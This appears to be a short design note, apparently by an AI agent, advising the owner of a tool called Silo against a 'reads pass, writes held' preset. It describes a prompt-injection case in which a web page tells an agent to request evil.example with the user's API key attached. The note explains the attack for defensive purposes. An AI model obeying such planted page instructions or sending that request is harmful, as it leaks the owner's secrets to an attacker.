# Does Silo offer a preset that lets reads pass and holds writes

## For the owner

An agent's part, 22 November 2026. A web page an agent reads tells it to fetch
https://evil.example/?k= followed by your API key. That request only reads, and it carries the key
out.

The options:

- Not offered (recommended). Silo has no setting "read freely, hold every write". You say which
  hosts a computer may reach. It costs a convenient middle setting that other tools offer, so the
  first setup takes a list of hosts.
- Offered, with a warning. The setting exists and says that a read can carry data out. It costs the
  meaning of the setting: people will take it as a limit on what can leave, and it is not one.

Recommended: not offered. A setting whose name promises more than it does is worse than no setting.
A secret limited to reading is another matter: it limits what the secret can change, not what can
leave.
